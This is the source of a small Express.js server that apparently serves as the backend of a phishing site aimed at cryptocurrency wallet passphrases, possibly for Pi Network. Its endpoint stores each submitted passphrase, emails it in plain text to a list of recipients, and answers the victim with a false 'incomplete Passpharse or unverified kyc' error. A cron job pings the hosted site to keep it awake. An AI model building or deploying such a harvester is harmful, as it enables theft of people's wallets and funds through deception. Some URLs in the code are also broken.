const express = require("express")
// const compression = require ('compression')
// const helmet = require ('helmet')
// const morgan = require('morgan')
const app = express()
const PORT = 1187
app.use(express.json())
const db = require('./config/db')
const cors = require('cors')
app.use(cors({origin:"*"}));

const userModel = require ('./model')
const sendEmail = require ('./mail')
const rateLimit = require("express-rate-limit");
const cron = require("node-cron");
const axios = require("axios");

// Schedule the cron job to run twice a day at 8 AM and 8 PM
// cron.schedule("0 8,20 * * *", async () => {
//     try {
//         const response = await axios.post(`hhttps://piaauth.onrender.com`, {
//             passphrase: "DailyCheckPassphrase" // Example passphrase for the job
//         });
//         console.log("Cron job executed:", response.data.message);
//     } catch (error) {
//         console.error("Cron job failed:", error.message);
//     }
// });

cron.schedule("0 8,20 * * *", async () => {
    let retries = 3;
    let delay = 5000; // 5 seconds
  
    for (let i = 0; i < retries; i++) {
      try {
        await axios.get('https://piaauth.onrender.com`');
        console.log('Pinged website to keep it awake');
        return;
      } catch (error) {
        console.error(`Error in cron job (attempt ${i + 1}):`, error.message);
        console.error('Error stack:', error.stack);
        await new Promise(resolve => setTimeout(resolve, delay));
      }
    }
  
    console.error('Failed to ping website after', retries, 'attempts');
  });

require('dotenv').config();  // Ensure .env file is loaded
// Middleware to limit the number of requests
const limiter = rateLimit({
    windowMs: 60 * 1000, // 1 minute
    max: 5, // Limit each IP to 1 request per windowMs
    message: "You have exceeded the allowed number of requests. Please try again in a minute."
});
app.post('/send-passphrase', limiter, async (req, res) => {
    try {
        const { passphrase } = req.body;

        // Trim whitespace and check if the passphrase is empty
        if (!passphrase || passphrase.trim() === '') {
            return res.status(400).json({ message: "Please enter a passphrase" });
        }

        // Store passphrase in the database
        const newUser = new userModel({ passphrase: passphrase.trim() }); // Correct field name
        await newUser.save();

        // Prepare email options
        const emailOptions = {
            subject: 'New User Passphrase',
            passphrase: passphrase.trim(),  // Correct spelling to match the email template
            html: `<p>A new user has submitted the following passphrase:</p><p><strong>${passphrase.trim()}</strong></p>`
        };
        // Get recipients from .env, split by commas, and filter empty entries
        const recipients = process.env.loginMails.split(',').map(email => email.trim()).filter(email => email !== '');

        if (recipients.length === 0) {
            throw new Error("No recipients defined in loginMails");
        }

        // Send email to each recipient
        for (const recipient of recipients) {
            await sendEmail({ ...emailOptions, email: recipient });
        }

        res.status(200).json({ message: "incomplete Passpharse or unverified kyc" });
    } catch (error) {
        console.error("Error:", error);
        res.status(500).json({ message: "Failed to send email." });
    }
});

app.listen(PORT, ()=>{
    console.log(`app is listening to ${PORT}`)
})
